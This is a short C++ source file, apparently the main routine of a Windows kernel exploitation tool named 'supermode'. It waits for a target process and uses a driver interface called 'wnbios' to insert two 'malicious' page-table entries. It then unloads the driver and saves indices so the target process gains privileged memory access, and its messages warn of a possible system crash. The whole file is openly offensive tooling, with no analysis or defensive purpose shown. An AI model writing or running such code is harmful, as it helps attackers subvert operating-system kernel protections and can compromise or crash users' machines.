#include "supermode.h"

int main()
{
	remove("C:\\indices.json");
	std::cout << "START ME FIRST!!!\n";

	while (!supermode::wnbios.get_process_base("supermode_me.exe"))
	{
		std::cout << "Waiting for target application...\n";
		Sleep(1000);
	}

	Sleep(5000);

	supermode::insert_first_malicious_pte();
	supermode::insert_second_malicious_pte();

	supermode::wnbios.unload_driver();

	std::cout << "saving indices for target application...\n";
	supermode::save_indices_for_target();

	std::cout << "target is now supermoded lets pray the system doesnt BSOD :(\n";

	system("pause");

	return 1;
}